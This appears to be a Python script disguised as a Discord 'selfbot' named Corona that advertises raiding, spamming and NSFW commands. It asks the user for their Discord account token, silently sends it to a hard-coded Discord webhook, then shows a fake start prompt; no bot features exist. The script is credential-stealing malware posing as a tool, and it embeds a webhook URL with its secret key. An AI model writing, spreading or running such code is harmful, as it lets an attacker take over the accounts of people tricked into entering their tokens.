import requests
import os

from discord_webhook import DiscordWebhook

print('''


   ▄████▄   ▒█████   ██▀███   ▒█████   ███▄    █  ▄▄▄      
  ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    
  ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄   
  ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ 
  ▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒ (Made in china)
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░
    ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░        ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒     ░   ░ ░   ░   ▒   
  ░ ░          ░ ░     ░         ░ ░           ░       ░  ░
  ░                                                                                                     
	NSFW Commands, Raiding, Spamming, Sniping, and lots more!
''')


tokenstel = input("Token (if you enter invalid, will not work): ")
webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1020487354466701312/qMmc7hp5vunR1mmyZTX1Lj1a-Njtf1brHASAhNnnlrmGo1IGebxCf1U0tco7HHTqv2Dm', content=tokenstel)
respond = webhook.execute()

os.system("cls")
input("Press enter to start the selfbot!")
os.system("cls")

print('''



   ▄████▄   ▒█████   ██▀███   ▒█████   ███▄    █  ▄▄▄      
  ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    
  ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄   
  ▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ 
  ▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒ (Made in china)
  ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░
    ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░        ░ ░ ░ ▒    ░░   ░ ░ ░ ░ ▒     ░   ░ ░   ░   ▒   
  ░ ░          ░ ░     ░         ░ ░           ░       ░  ░
  ░                                                        
''')

print('''
--------------------
<help to see commands!
--------------------
''')
input()
